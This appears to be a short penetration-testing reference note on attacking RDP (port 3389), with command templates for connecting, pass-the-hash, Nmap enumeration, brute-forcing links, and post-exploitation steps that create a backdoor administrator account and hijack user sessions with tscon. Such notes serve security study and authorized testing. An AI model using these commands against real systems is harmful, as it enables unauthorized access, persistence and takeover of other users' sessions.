---
Ports: 3389
Description: Remote Desktop Protocol (RDP) is a proprietary protocol developed by Microsoft, which provides a user with a graphical interface to connect to another computer over a network connection. The user employs RDP client software for this purpose, while the other computer must run RDP server software.
---

>[!info]
> bla bla


# Basic Usage

## Connect with known creds

```bash
# Password
rdesktop -u <username> <IP>
rdesktop -d <domain> -u <username> -p <password> <IP> +clipboard

xfreerdp /u:[domain\]<username> /p:<password> /v:<IP> +clipboard
xfreerdp /u:<username> /p:<password> /v:<IP> /d:<domain> +clipboard

# PtH
xfreerdp /u:[domain\]<username> /pth:<hash> /v:<IP> +clipboard
```

Check creds with [rdp_check](../Tools/impacket.md#rdp_check)

```bash
rdp_check <domain>/<name>:<password>@<IP>
```

---

# Enumeration

- [NSE (Nmap Scripting Engine)](../Tools/nmap.md#NSE%20(Nmap%20Scripting%20Engine))

```bash
nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 <IP>
```

---

# Exploitation

## Brute Force

- [crowbar](../Tools/crowbar.md#RDP%20Brute-Force)
- [hydra](../Tools/hydra.md#RDP%20Brute-Force)

---

# Post Exploitation

## Adding User to RDP group

```powershell
net user haxxor Haxxor123 /add
net localgroup Administrators haxxor /add
net localgroup "Remote Desktop Users" haxxor /ADD
```

## Session Stealing

```powershell
query user
tscon <ID> /dest:<SESSIONNAME>
```